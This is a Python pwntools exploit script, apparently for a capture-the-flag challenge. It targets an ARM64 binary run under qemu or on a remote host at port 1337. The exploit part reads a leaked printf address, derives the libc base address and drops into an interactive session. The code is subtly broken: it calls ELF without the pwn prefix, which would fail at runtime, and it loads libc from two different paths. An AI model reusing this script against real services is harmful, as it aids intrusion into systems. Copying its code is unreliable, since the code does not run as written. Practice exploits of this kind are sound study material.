#!/usr/bin/env python
# -*- coding: utf-8 -*-

# this exploit was generated via
# 1) pwntools
# 2) ctfinit

import os
import time
import pwn


# Set up pwntools for the correct architecture
exe  = pwn.context.binary = pwn.ELF('./arm')
libc = pwn.ELF("./chroot/lib/libc.so.6")
pwn.context.terminal = ["tilix","-a","session-add-right","-e"]

pwn.context.delete_corefiles = True
pwn.context.rename_corefiles = False

host = pwn.args.HOST or 'vps.mishrasunny174.tech'
port = int(pwn.args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if pwn.args.GDB:
        bt = pwn.process(["./chroot/qemu-aarch64", "-g", "9191", "-L" , "./", "-nx", exe.path] + argv, *a, **kw)    
        if os.fork() == 0:
            a = open("/tmp/gdb.gdb", "w")
            a.write(gdbscript)
            a.close()
            cmd = " ".join(pwn.context.terminal) + " gdb-multiarch %s -x /tmp/gdb.gdb" % exe.path
            os.system(cmd)
            os.kill(os.getpid(), 9)

        return bt    
    else:
        return pwn.process(["./chroot/qemu-aarch64", "-L" , "./", "-nx", exe.path] + argv, *a, **kw)    

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = pwn.connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if pwn.args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
target remote :9191
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

libc = ELF("./libc.so.6")
io = start()
io.recvuntil("print at ")
libc.address = int(io.recvline().strip(b"\n"), 16) - libc.sym['printf']
print(hex(libc.address))
io.interactive()